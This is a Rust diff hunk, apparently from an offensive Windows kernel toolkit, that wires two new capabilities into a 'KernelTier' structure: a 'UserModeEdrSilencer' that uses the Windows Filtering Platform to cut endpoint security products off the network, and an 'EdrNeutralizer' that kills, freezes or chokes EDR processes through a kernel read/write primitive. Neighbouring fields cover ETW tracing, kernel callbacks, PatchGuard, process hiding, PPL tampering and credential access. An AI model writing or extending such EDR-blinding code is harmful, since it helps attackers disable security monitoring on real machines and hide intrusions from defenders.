@@ -526,15 +526,35 @@ pub fn assemble_tier(
     // The caller uses `select_pg_window(_build, bootstrap.as_kernel_rw())` at the
     // point of use — see `select_pg_window` above.
 
+    // WFP silencer — `UserModeEdrSilencer` is a zero-field unit struct that
+    // resolves FwpmEngineOpen0 from fwpuclnt.dll at call time (no offsets, no
+    // kernel handle). It's always available on Windows with admin rights, so
+    // wire it unconditionally — no build/version dependency.
+    let wfp = Some(Box::new(crate::netsec::UserModeEdrSilencer) as Box<dyn crate::WfpKit>);
+
+    // EDR neutralize (Kill/Freeze/Choke). Freeze+Choke are user-mode FFI that
+    // run regardless of offsets; Kill needs the kernel primitive (operator
+    // calls EdrNeutralizer::kill(krw, pid) directly). Wire when we have the
+    // EPROCESS offsets (same prerequisite as hide/ppl).
+    let neutralize = if runtime.ps_active_process_head_kva != 0 {
+        Some(Box::new(crate::netsec::EdrNeutralizer {
+            ps_active_process_head_kva: runtime.ps_active_process_head_kva,
+            offsets: eprocess,
+        }) as Box<dyn crate::EdrNeutralizeKit>)
+    } else {
+        None
+    };
+
     KernelTier {
         rw: krw,
         etw_ti,
         callbacks,
         minifilter,
-        wfp: None, // WfpKit has no real impl yet (user-mode pacer.sys path).
-        pg: None,  // see select_pg_window() — borrows KernelRw, can't be owned.
+        wfp,
+        pg: None, // see select_pg_window() — borrows KernelRw, can't be owned.
         hide,
         ppl,
         cred,
+        neutralize,
     }
 }
